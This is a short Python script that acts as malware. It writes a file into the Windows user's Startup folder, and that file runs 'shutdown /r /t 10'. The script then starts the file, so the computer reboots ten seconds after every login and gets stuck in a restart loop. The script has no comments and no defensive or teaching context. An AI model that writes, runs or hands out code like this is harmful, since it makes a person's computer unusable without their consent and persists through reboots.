import os
file_path = '''c:/users/''' + os.getlogin() + '''/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/_.py'''
x = open(file_path, "w+")
x.write("import os\nos.system('shutdown /r /t 10')")
x.close()
print("start '" + file_path + "'")
os.system("start '" + file_path + "'")
x.close()
